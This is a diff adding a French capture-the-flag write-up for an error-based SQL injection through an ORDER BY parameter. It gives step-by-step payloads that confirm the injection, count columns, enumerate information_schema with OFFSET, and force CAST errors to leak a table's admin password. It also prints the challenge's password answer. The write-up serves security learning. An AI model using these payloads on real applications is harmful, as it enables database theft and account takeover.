@@ -429,3 +429,180 @@ PortSwigger recommande donc :
 
 - **PortSwigger – Preventing **CSRF** vulnerabilities**  
   [https://portswigger.net/web-security/csrf/preventing](https://portswigger.net/web-security/csrf/preventing)
+  
+
+# Challenge 7 --- SQL Injection Error-Based
+
+##  Objectif du challenge
+
+L'objectif du challenge est d'exploiter une injection SQL pour récupérer
+des informations sensibles contenues dans la base de données.
+L'application présente une fonctionnalité de tri (`ORDER BY`)
+manipulable par l'utilisateur, ce qui en fait un point d'injection
+potentiel.
+
+------------------------------------------------------------------------
+
+##  Vulnérabilité : SQL Injection Error-Based (via ORDER BY)
+
+La vulnérabilité repose sur une injection SQL dans la clause
+`ORDER BY`.\
+Le paramètre `order`, transmis via l'URL, est intégré directement dans
+la requête SQL sans filtrage.
+
+Une injection dans `ORDER BY` permet :
+
+-   De provoquer des **erreurs SQL volontairement**.
+-   D'injecter des **sous-requêtes SQL**.
+-   D'afficher des données internes via un **CAST provoquant une
+    erreur**.
+
+Cette technique est appelée :\
+ **Error‑Based SQL Injection**
+
+------------------------------------------------------------------------
+
+# Étapes de l'exploitation
+
+## 1. Détection de la fonctionnalité vulnérable
+
+Nous constatons la présence du paramètre :
+
+    ?action=contents&order=ASC
+
+Ce paramètre influence l'affichage → il est donc probablement utilisé
+dans un `ORDER BY`.\
+Nous décidons de tester ici notre injection.
+
+------------------------------------------------------------------------
+
+## 2. Premiers tests : `ASCX` puis `ASC,+1`
+
+-   `ASCX` génère une erreur SQL → **injection confirmée**.
+  <img width="2938" height="382" alt="Capture d’écran 2025-12-03 à 14 45 13" src="https://github.com/user-attachments/assets/812c275a-425e-4a96-99ae-ec202b0792f4" />
+
+-   `ASC,+1` fonctionne → **la requête accepte une deuxième
+    expression**.
+  <img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 46 31" src="https://github.com/user-attachments/assets/24704dfb-6ef7-49d1-9d93-0c7b3ee9aa49" />
+
+
+Cela confirme que nous pouvons injecter des expressions additionnelles
+dans le `ORDER BY`.
+
+------------------------------------------------------------------------
+
+## 3. Déterminer le nombre de colonnes
+
+Tests successifs :
+
+-   `ASC,+1` → OK\
+-   `ASC,+2` → OK\
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 46 31" src="https://github.com/user-attachments/assets/24704dfb-6ef7-49d1-9d93-0c7b3ee9aa49" />
+-   `ASC,+3` → erreur : « ORDER BY position 3 is not in select list »
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 47 35" src="https://github.com/user-attachments/assets/6b0ee777-4d7a-4f04-8cea-0f5bec2583e2" />
+
+
+Le SELECT retourne **2 colonnes**.
+
+Cette étape valide que nous pouvons utiliser la deuxième position du
+`ORDER BY` pour injecter des sous‑requêtes.
+
+------------------------------------------------------------------------
+
+## 4. Premier test de sous‑requête
+
+Nous essayons :
+
+    (SELECT table_name FROM information_schema.tables LIMIT 1)
+
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 51 52" src="https://github.com/user-attachments/assets/abdcb72a-4d00-471c-8189-0dd1060c0000" />
+
+
+Aucune erreur → mais aucune data visible.
+
+Cela montre qu'il faut **provoquer une erreur SQL contrôlée** pour
+afficher la donnée.
+
+------------------------------------------------------------------------
+
+## 5. Déclenchement volontaire d'erreur avec CAST
+
+Nous injectons :
+
+    CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)
+
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 52 51" src="https://github.com/user-attachments/assets/848c3c84-131a-4ba7-96a6-016ee4823c74" />
+
+
+La conversion échoue, ce qui révèle :
+
+    "m3mbr35t4bl3"
+
+ **Nous obtenons le nom de la table sensible.**
+
+------------------------------------------------------------------------
+
+## 6. Extraction des colonnes de la table
+
+Nous parcourons `information_schema.columns`.
+
+Notre injection :
+
+    CAST((SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET X) AS INTEGER)
+
+Résultats :
+
+-   OFFSET 0 → `id`
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 54 04" src="https://github.com/user-attachments/assets/8089ea51-b681-405c-afe6-ec160faee2b0" />
+
+-   OFFSET 1 → `us3rn4m3_c0l`
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 54 43" src="https://github.com/user-attachments/assets/ae757072-7642-4d81-83d7-bb983d52551b" />
+
+-   OFFSET 2 → `p455w0rd_c0l`
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 14 55 05" src="https://github.com/user-attachments/assets/0d762fcc-67c5-4dfc-b59d-2abc37ac7e8a" />
+
+Nous avons désormais le nom de la colonne du mot de passe.
+
+Pourquoi utiliser OFFSET ?
+
+`LIMIT 1` ne renvoie que le premier élément.\
+`OFFSET` permet d'atteindre :
+
+-   la 2e colonne → OFFSET 1\
+-   la 3e colonne → OFFSET 2
+
+C'est indispensable pour parcourir toutes les colonnes de la table.
+
+------------------------------------------------------------------------
+
+## 8. Extraction finale du mot de passe
+
+Une fois la bonne colonne identifiée, nous injectons :
+
+    CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1) AS INTEGER)
+    
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 15 04 42" src="https://github.com/user-attachments/assets/174039f1-cba1-435b-bdde-aad3d515b07f" />
+
+
+Erreur obtenue :
+
+    invalid input syntax for type double precision: "1a2BdKT5DIx3qxQN3UaC"
+
+Le mot de passe admin apparaît dans l'erreur SQL.\
+
+------------------------------------------------------------------------
+
+#  Solution
+
+Mettre le mot de passe "1a2BdKT5DIx3qxQN3UaC" dans la page authentification :
+
+<img width="2494" height="382" alt="Capture d’écran 2025-12-03 à 15 05 57" src="https://github.com/user-attachments/assets/c1c34c9a-cb54-4578-86cc-3247104920c8" />
+
+<img width="2494" height="416" alt="Capture d’écran 2025-12-03 à 15 06 03" src="https://github.com/user-attachments/assets/d17484bf-9001-4eb5-8f48-b070d6248042" />
+
+
+
+
+
+
+  
